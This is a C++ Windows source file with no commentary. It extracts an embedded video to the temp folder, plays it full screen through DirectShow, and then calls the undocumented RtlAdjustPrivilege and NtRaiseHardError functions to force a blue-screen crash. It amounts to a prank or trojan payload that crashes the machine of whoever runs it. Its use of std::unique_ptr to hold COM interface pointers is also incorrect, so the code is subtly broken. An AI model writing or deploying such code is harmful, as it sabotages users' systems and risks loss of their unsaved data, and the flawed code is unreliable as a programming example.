#include <windows.h>
#include <dshow.h>
#include <memory>

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

std::unique_ptr<IGraphBuilder> graph;
std::unique_ptr<IMediaControl> control;
std::unique_ptr<IMediaEvent> event;
std::unique_ptr<IVideoWindow> window;

void GetVideoResource(LPWSTR* path) {
    HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(2), RT_RCDATA);
    if (resource == NULL) {
        ExitProcess(1);
    }

    DWORD size = SizeofResource(NULL, resource);
    LPVOID data = LockResource(LoadResource(NULL, resource));
    if (data == NULL) {
        ExitProcess(1);
    }

    *path = new WCHAR[MAX_PATH];
    GetTempPathW(MAX_PATH, *path);
    StringCbCatW(*path, MAX_PATH, L"video.wmv");

    HANDLE file = CreateFileW(*path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        ExitProcess(1);
    }

    DWORD written;
    if (!WriteFile(file, data, size, &written, NULL) || written != size) {
        CloseHandle(file);
        ExitProcess(1);
    }

    CloseHandle(file);
    FreeResource(resource);
}

void InitializeDirectShow(LPCWSTR path) {
    CoInitialize(NULL);

    graph.reset();
    CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&graph);

    control.reset();
    graph->QueryInterface(IID_IMediaControl, (void**)&control);

    event.reset();
    graph->QueryInterface(IID_IMediaEvent, (void**)&event);

    window.reset();
    graph->QueryInterface(IID_IVideoWindow, (void**)&window);

    graph->RenderFile(path, NULL);
    window->put_FullScreenMode(OATRUE);
}

ULONG TriggerBSOD() {
    BOOLEAN state;
    ULONG response;
    RtlAdjustPrivilege(19, TRUE, FALSE, &state);
    NtRaiseHardError(0xdeadbeef, 0, 0, NULL, 6, &response);
    return response;
}

int main() {
    LPWSTR path;
    GetVideoResource(&path);

    try {
        InitializeDirectShow(path);
        control->Run();
        event->WaitForCompletion(INFINITE, nullptr);
    } catch (const std::exception& e) {
        return 1;
    }

    TriggerBSOD();

    return 1;
}
